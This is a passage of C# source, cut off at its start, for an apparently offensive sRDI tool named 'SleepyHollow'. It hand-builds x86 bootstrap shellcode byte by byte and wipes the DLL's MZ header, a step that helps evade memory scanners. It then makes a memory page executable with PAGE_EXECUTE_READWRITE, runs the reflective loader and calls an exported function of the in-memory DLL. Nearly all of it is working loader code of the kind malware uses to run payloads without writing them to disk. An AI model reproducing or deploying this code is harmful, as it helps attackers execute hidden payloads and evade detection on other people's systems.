            newShellcode.Add(0xc3);
            foreach (byte b in BitConverter.GetBytes((uint)(dllOffset + dllBytes.Length)))
                newShellcode.Add(b);

            // push <Flags>
            newShellcode.Add(0x68);
            foreach (byte b in BitConverter.GetBytes(flags))
                newShellcode.Add(b);

            // push <Length of User Data>
            newShellcode.Add(0x68);
            foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                newShellcode.Add(b);

            // push ebx
            newShellcode.Add(0x53);

            // push <hash of function>
            newShellcode.Add(0x68);
            foreach (byte b in BitConverter.GetBytes(functionHash))
                newShellcode.Add(b);

            // push eax
            newShellcode.Add(0x50);

            // call - Transfer execution to the RDI
            newShellcode.Add(0xe8);
            newShellcode.Add((byte)(bootstrapSize - newShellcode.Count - 4)); // Skip over the remainder of instructions
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);
            newShellcode.Add(0x00);

            // add esp, 0x14 - correct the stack pointer
            newShellcode.Add(0x83);
            newShellcode.Add(0xc4);
            newShellcode.Add(0x14);

            // ret - return to caller
            newShellcode.Add(0xc3);

            //Write the rest of RDI
            foreach (byte b in rdiShellcode)
                newShellcode.Add(b);

            //Write our DLL
            dllBytes[0] = 0x00;
            dllBytes[1] = 0x00;
            foreach (byte b in dllBytes)
                newShellcode.Add(b);

            //Write our userdata
            foreach (byte b in userData)
                newShellcode.Add(b);
        }

        return newShellcode.ToArray();
    }

    public static void CallExportedFunction(byte[] dll, string exportName, byte[] argumentBytes)
    {
        byte[] shellcode = null;

        // 0x30627745 - 'SayHello' - FunctionToHash.py (Meh, I'm too lazy to change this)
        shellcode = RDILoader.ConvertToShellcode(dll, 0x30627745, argumentBytes, 0);
        Console.WriteLine("[+] Converted DLL to shellcode");

        GCHandle scHandle = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
        IntPtr scPointer = scHandle.AddrOfPinnedObject();
        uint flOldProtect;

        // Only set the first page to RWX
        // This is should sufficiently cover the sRDI shellcode up top
        if (
            !SleepyHollow.Lib.VirtualProtect(
                scPointer,
                (UIntPtr)4096,
                Native.PAGE_EXECUTE_READWRITE,
                out flOldProtect
            )
        )
        {
            Console.WriteLine("[!] Failed to set memory flags");
            return;
        }

        ReflectiveLoader reflectiveLoader = (ReflectiveLoader)
            Marshal.GetDelegateForFunctionPointer(scPointer, typeof(ReflectiveLoader));

        Console.WriteLine("[+] Executing RDI");

        IntPtr peLocation = reflectiveLoader();

        IntPtr expFunctionLocation = PE.GetProcAddressR(peLocation, exportName);
        if (expFunctionLocation != IntPtr.Zero)
        {
            ExportedFunction exportedFunction = (ExportedFunction)
                Marshal.GetDelegateForFunctionPointer(
                    expFunctionLocation,
                    typeof(ExportedFunction)
                );
            GCHandle userDataHandle = GCHandle.Alloc(argumentBytes, GCHandleType.Pinned);
            IntPtr userDataPointer = userDataHandle.AddrOfPinnedObject();

            Console.WriteLine("[+] Calling exported function");

            exportedFunction(userDataPointer, (uint)argumentBytes.Length);
        }
    }
}
